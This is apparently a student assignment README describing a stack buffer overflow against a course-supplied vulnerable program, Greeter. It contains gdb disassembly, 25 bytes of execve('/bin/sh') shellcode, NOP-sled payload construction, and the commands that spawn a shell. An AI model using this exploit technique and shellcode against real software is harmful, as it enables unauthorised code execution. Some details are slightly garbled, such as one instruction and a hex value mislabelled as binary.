Assignment 7 - msiotos 2016030030 - gangelopoulos 2016030083

Notes:

At first we used the command sudo apt-get install gcc-multilib to help us cross-compile 32-bit binary code.
We used the precompiled version of Greeter as recommended.
Also, our exploit needs to run on python2 for compatibility reasons, so we make sure we install it.

Finding the buffer and the return address location:

When providing a long string of "A" characters we get a segmentation fault as expected. 
By using disas readString on gdb mode we get:
(gdb) disas readString
Dump of assembler code for function readString:
   0x080488a5 <+0>:	push   %ebp
   0x080488a6 <+1>:	mov    %esp,%ebp
   0x080488a8 <+3>:	push   %ebx
   0x080488a9 <+4>:	sub    $0x34,%esp
   0x080488ac <+7>:	call   0x8048780 <__x86.get_pc_thunk.bx>
   0x080488b1 <+12>:	add    $0x9074f,%ebx
   0x080488b7 <+18>:	sub    $0xc,%esp
   0x080488ba <+21>:	lea    -0x2c(%ebp),%eax
   0x080488bd <+24>:	push   %eax
   0x080488be <+25>:	call   0x80501a0 <gets>
   0x080488c3 <+30>:	add    $0x10,%esp
   0x080488c6 <+33>:	movlx0,-0xc(%ebp)
   0x080488cd <+40>:	jmp    0x80488ed <readString+72>
   0x080488cf <+42>:	lea    -0x2c(%ebp),%edx
   0x080488d2 <+45>:	mov    -0xc(%ebp),%eax
   0x080488d5 <+48>:	add    %edx,%eax
   0x080488d7 <+50>:	movzbl (%eax),%eax
   0x080488da <+53>:	mov    %eax,%ecx
   0x080488dc <+55>:	mov    $0x80dacc0,%edx
   0x080488e2 <+61>:	mov    -0xc(%ebp),%eax
   0x080488e5 <+64>:	add    %edx,%eax
   0x080488e7 <+66>:	mov    %cl,(%eax)

gets is called to read a string from the standard input into the buffer located at %ebp - 0x2c
lea    -0x2c(%ebp),%eax : This implies that there is an offset of 44 bytes (0x2c in binary)

Then, by using disas main on gdb mode we find that the address of the variable Name[] is 0x80dacc0, which we will use as our return address.

Shellcode:

For the next step, we found an online example of a shellcode that spawns a shell and we saved it as shellcode.nasm.
After compiling it using: nasm -f elf shellcode.asm we got the shellcode bytes with the command: objdump -d -M intel shellcode.o
Extracting the bytes gave us the shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 which will be used for the payload.

Constructing the payload:

We convert the memory address (0x80dacc0) to little-endian format for proper representation in memory.
The shellcode variable contains x86 assembly instructions for spawning a shell using the execve() system call. It's designed to be 25 bytes in length.
We create a NOP sled of 23 bytes to increase the likelihood of successfully hitting the correct starting point for the shellcode.
We needed it to be 23 bytes to go on the start of the name address, since Name[] + the offset are 4+44=48 bytes.

Execution

Use the following sequence
python2 generator.py > exploit_input.txt: This creates our payload and we store it on a .txt file
(cat exploit_input.txt ;cat)| ./Greeter: We run `Greeter` through the .txt file generated above
who/ls/(any other cmd command): A new terminal is spawned inside, and we can use different cmd commands to test it works.

In our zip you will find the generator.py, exploit_input.txt shellcode.nasm and README files.
We also added the given Greeter.c, Greeter and Makefile that have no changes.
